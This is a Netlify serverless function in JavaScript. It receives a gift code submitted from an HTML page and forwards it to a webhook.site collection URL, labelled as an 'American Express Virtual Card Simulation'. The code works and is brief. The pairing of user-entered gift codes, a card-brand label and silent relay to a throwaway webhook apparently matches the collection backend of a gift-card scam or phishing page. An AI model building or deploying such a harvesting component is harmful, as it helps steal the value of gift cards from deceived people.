// netlify/functions/send-webhook.js
const fetch = require('node-fetch'); // Netlify provides this automatically

exports.handler = async function(event, context) {
    // Ensure only POST requests are allowed
    if (event.httpMethod !== "POST") {
        return { statusCode: 405, body: "Method Not Allowed" };
    }

    try {
        // Parse the data sent from your HTML
        const { giftCode } = JSON.parse(event.body);
        // Your actual webhook.site URL
        const webhookUrl = process.env.WEBHOOK_URL; // Use environment variable

        // Forward the data to your webhook.site URL
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            // Send the giftCode you received, and optionally some context
            body: JSON.stringify({
                code: giftCode,
                source: "American Express Virtual Card Simulation"
            }),
        });

        // Check if the webhook received it successfully
        if (response.ok) {
            return {
                statusCode: 200,
                body: JSON.stringify({ message: "Gift code sent successfully to webhook!" }),
            };
        } else {
            // If webhook.site returns an error
            const errorDetails = await response.text();
            return {
                statusCode: response.status,
                body: JSON.stringify({ message: "Failed to forward gift code", details: errorDetails }),
            };
        }
    } catch (error) {
        // If anything goes wrong in this function
        console.error("Function error:", error);
        return {
            statusCode: 500,
            body: JSON.stringify({ message: "Internal server error", error: error.message }),
        };
    }
};
